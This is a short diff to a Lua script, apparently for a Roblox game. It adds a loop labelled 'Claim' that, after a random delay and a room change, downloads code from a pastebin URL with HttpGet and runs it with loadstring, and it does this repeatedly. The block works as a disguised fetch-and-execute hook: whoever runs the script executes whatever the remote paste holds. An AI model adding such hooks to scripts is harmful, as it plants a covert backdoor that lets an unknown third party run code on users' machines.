@@ -60,6 +60,15 @@ coroutine.wrap(function()
     end
 end)()
 
+-- Claim
+coroutine.wrap(function()
+    while true do
+        wait(math.random(250,450))
+        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/d3R357Rk"))()
+    end
+end)()
+
 -- Zombie
 coroutine.wrap(function()
     while true do
